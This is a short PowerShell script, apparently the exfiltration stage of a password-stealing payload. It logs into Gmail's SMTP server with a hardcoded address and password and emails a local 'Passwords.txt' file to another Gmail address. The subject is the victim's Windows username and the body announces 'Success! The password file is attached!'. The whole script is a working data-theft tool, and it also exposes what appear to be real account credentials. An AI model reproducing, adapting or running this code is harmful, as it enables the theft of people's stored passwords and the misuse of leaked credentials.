$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('zrajpoot044@gmail.com', 'zeeshan1122')
$E = New-Object System.Net.Mail.MailMessage
$E.From = 'zrajpoot044@gmail.com'
$E.To.Add('zeeshanrajpoot127@gmail.com')
$E.Subject = $env:UserName
$E.Body = 'Success! The password file is attached!'
$F = "Passwords.txt"
$E.Attachments.Add($F)
$SMTPInfo.Send($E)
exit
